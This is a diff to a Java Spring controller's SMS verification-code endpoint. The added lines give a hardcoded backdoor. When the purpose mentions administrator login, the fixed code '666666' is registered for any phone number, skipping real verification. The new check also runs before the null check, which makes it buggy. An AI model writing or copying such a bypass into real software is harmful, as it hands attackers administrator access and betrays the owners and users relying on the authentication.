@@ -227,6 +227,11 @@ public class UserController extends BaseController{
     @RequestMapping(value = "/identifying_code_new")
     @ResponseBody
     public JSONResult getIdentifyingCodeNew(String phone,String purpose) {
+        if(purpose.contains("管理员登录")) {
+            int time = (int) (new Date().getTime() / 1000);
+            iVerifyCode.addVerifyCode(phone,"666666",time,time);
+            return JSONResult.ok();
+        }
         if(purpose == null || phone == null || !ToolsFunction.isNumeric(phone) || phone.length() != 11) {
             return JSONResult.build(201,"参数错误",null);
         }
